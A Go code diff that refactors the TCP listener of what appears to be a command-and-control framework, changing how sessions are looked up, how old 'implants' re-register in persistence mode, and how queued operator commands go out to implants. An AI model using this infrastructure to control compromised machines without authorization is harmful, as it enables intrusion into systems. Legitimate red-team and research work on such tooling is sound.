@@ -169,10 +169,11 @@ func TCPServerHandler(conn net.Conn, cryptoPSK string) {
 		return
 	}
 
-	if core.Sessions[tcpParams.SessionID].Implant.ID != tcpParams.UUID || tcpParams.UUID == core.ZeroedUUID {
-
+	sVal, ok := core.Sessions.Load(tcpParams.SessionID)
+	if !ok {
+		// Session missing
 		if core.PersistenceMode {
-			reconnectString := "Old implant with UUID: " + tcpParams.UUID.String() + "connected, attempting to reestablish session..."
+			reconnectString := "Old implant with UUID: " + tcpParams.UUID.String() + " connected, attempting to reestablish session..."
 			core.LogData(reconnectString)
 			core.WarningColorBold.Println(reconnectString)
 
@@ -207,7 +208,47 @@ func TCPServerHandler(conn net.Conn, cryptoPSK string) {
 			ErrorHandler(returnErr)
 			return
 		}
+	}
 
+	session := sVal.(core.Session)
+
+	if session.Implant.ID != tcpParams.UUID || tcpParams.UUID == core.ZeroedUUID {
+		if core.PersistenceMode {
+			reconnectString := "Old implant with UUID: " + tcpParams.UUID.String() + " connected, attempting to reestablish session..."
+			core.LogData(reconnectString)
+			core.WarningColorBold.Println(reconnectString)
+
+			implant := core.RegisterImplant(tcpParams.ImplantArch, tcpParams.Update, additionalFunctions, tcpParams.UUID.String())
+
+			core.RegisterSession(core.SessionID, "TCP", implant, remoteAddr, 0, "", "", "", "")
+
+			newSession := core.SessionID - 1
+
+			response := map[string]interface{}{
+				"sessionID": newSession,
+				"UUID":      implant.ID,
+			}
+
+			jsonResp, err := json.Marshal(response)
+
+			if err != nil {
+				errorString := "Error converting TCP response to JSON"
+				core.LogData(errorString)
+				core.ErrorColorBold.Println(errorString)
+			}
+
+			conn.Write([]byte(jsonResp))
+
+			core.BroadcastSession(strconv.Itoa(newSession))
+
+			return
+		} else {
+			errorString := "TCP Request Invalid UUID, request ignored"
+			core.LogData(errorString)
+			returnErr := errors.New(errorString)
+			ErrorHandler(returnErr)
+			return
+		}
 	}
 
 	if tcpParams.Data != "" {
@@ -241,9 +282,9 @@ func TCPServerHandler(conn net.Conn, cryptoPSK string) {
 	var cmd string
 	var user string
 
-	if core.Sessions[tcpParams.SessionID].Implant.Commands != nil {
-		cmd = core.Sessions[tcpParams.SessionID].Implant.Commands[0].Command
-		user = core.Sessions[tcpParams.SessionID].Implant.Commands[0].Operator
+	if session.Implant.Commands != nil {
+		cmd = session.Implant.Commands[0].Command
+		user = session.Implant.Commands[0].Operator
 	}
 
 	response := map[string]interface{}{
